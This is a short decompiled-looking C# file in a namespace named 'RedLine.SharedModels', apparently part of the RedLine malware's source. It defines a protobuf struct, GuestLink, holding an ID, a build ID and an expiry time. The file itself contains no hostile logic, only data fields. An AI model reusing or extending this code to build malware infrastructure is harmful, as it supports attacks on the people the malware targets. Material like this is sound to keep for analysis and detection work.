using System.Runtime.CompilerServices;
using ProtoBuf;

namespace RedLine.SharedModels;

[ProtoContract(Name = "GuestLink")]
public struct GuestLink
{
	[CompilerGenerated]
	private string string_0;

	[CompilerGenerated]
	private string string_1;

	[CompilerGenerated]
	private string string_2;

	[ProtoMember(1, Name = "GuestLink")]
	public string ID
	{
		[CompilerGenerated]
		get
		{
			return string_0;
		}
		[CompilerGenerated]
		set
		{
			string_0 = value;
		}
	}

	[ProtoMember(2, Name = "BuildID")]
	public string BuildID
	{
		[CompilerGenerated]
		get
		{
			return string_1;
		}
		[CompilerGenerated]
		set
		{
			string_1 = value;
		}
	}

	[ProtoMember(3, Name = "ExpiresTime")]
	public string ExpiresTime
	{
		[CompilerGenerated]
		get
		{
			return string_2;
		}
		[CompilerGenerated]
		set
		{
			string_2 = value;
		}
	}
}
